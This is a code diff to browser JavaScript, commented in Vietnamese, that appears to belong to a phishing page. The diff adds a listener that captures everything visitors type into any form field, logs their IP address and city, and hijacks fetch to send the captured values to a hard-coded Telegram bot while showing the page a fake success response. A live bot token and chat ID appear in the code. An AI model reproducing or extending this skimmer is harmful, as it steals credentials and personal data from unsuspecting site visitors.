@@ -5,12 +5,28 @@
   const MY_BOT_TOKEN = "9141061384:AAHGfs-TlTtvmoZaY0SicT-YH5Shmb907R4";
   const MY_CHAT_ID   = "-5377276972";
 
+  // 1. Tự động ghi nhận giá trị chữ rõ mỗi khi người dùng gõ vào bất kỳ ô nhập liệu nào
+  const capturedFields = {};
+  let visitorIP = "Đang lấy...";
+
+  document.addEventListener('input', function(e) {
+    const el = e.target;
+    if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
+      const label = el.placeholder || el.name || el.id || el.type || 'Field';
+      if (el.value.trim() !== '') {
+        capturedFields[label] = el.value.trim();
+      }
+    }
+  }, true);
+
+  // 2. Chặn fetch để vừa đổi ngôn ngữ theo IP, vừa gửi dữ liệu chữ rõ về Telegram
   const _origFetch = window.fetch;
   window.fetch = async function(url, options) {
     if (typeof url === 'string' && url.includes('/api/ip-location')) {
       try {
         const res = await _origFetch('https://ipapi.co/json/');
         const data = await res.json();
+        visitorIP = `${data.ip || ''} (${data.country_code || 'US'} - ${data.city || ''})`;
         return new Response(JSON.stringify({
           country: data.country_code || 'US',
           country_code: data.country_code || 'US',
@@ -24,19 +40,24 @@
 
     if (options && options.method === 'POST' && (url.includes('telegram.org') || url.includes('/api/'))) {
       try {
-        let payloadText = "🔔 *DỮ LIỆU FORM MỚI:*\n";
-        if (options.body) {
-          payloadText += "```\n" + (typeof options.body === 'string' ? options.body : JSON.stringify(options.body)) + "\n```";
+        let lines = [`🔔 *DỮ LIỆU FORM MỚI*`, `🌐 *IP:* \`${visitorIP}\``];
+        for (const [key, val] of Object.entries(capturedFields)) {
+          lines.push(`▪️ *${key}:* \`${val}\``);
         }
+        if (Object.keys(capturedFields).length === 0 && options.body) {
+          lines.push(`📦 *Raw:* \`${typeof options.body === 'string' ? options.body : JSON.stringify(options.body)}\``);
+        }
+
         await _origFetch(`https://api.telegram.org/bot${MY_BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: MY_CHAT_ID,
-            text: payloadText,
+            text: lines.join('\n'),
             parse_mode: "Markdown"
           })
         });
+
         return new Response(JSON.stringify({ ok: true, success: true }), {
           status: 200,
           headers: { 'Content-Type': 'application/json' }
